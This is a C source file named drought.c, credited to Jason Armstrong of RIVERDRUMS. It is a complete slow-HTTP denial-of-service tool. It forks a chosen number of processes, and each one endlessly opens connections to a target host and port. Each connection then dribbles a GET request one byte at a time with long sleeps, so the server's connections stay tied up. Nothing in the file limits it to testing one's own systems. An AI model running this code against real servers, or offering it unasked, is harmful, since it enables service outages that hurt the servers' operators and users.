/* drought.c Jason Armstrong <ja@riverdrums.com> © 2006-2007 RIVERDRUMS
 * $Id$ */

#include "common.h"

#undef TIMEOUT
#define TIMEOUT 25

int  _drought(int forks, char *host, char *port, int timeout);
void _do_drought(struct addrinfo *a, int timeout);

int main(int argc, char *argv[]) {
  if (argc < 4) _usage("drought");
  signal(SIGPIPE, SIG_IGN); signal(SIGCHLD, SIG_IGN);
  return _drought(atoi(argv[1]), argv[2], argv[3], argc == 4 ? TIMEOUT : atoi(argv[4]));
}

int _drought(int forks, char *host, char *port, int timeout)
{
  struct addrinfo *ai = _get_addrinfo(host, port);
  if (!ai) return -1;
  while (forks--) {
    if (fork() == 0) {
      do { _do_drought(ai, timeout); } while (1);
      exit(0);
    }
  }
  return 0;
}

void _do_drought(struct addrinfo *a, int timeout)
{
  char *get = "GET / HTTP/1.0\r\n\r\n";
  int fd, i, r, on, gl = strlen(get);

  if ( (fd = socket(a->ai_family, a->ai_socktype, a->ai_protocol)) >= 0) {
    on = 1; setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &on, sizeof(on));
    do { r = connect(fd, a->ai_addr, a->ai_addrlen); } while (r == -1 && errno == EINTR);
    if (r == 0) {
      for (i = 0; i < gl; i++) {
        sleep(timeout);
        if (writen(fd, &get[i], 1, timeout) <= 0) break;
      }
      if (i == gl) sleep(timeout);
    }
    do { r = close(fd); } while (r == -1 && errno == EINTR);
  }
}
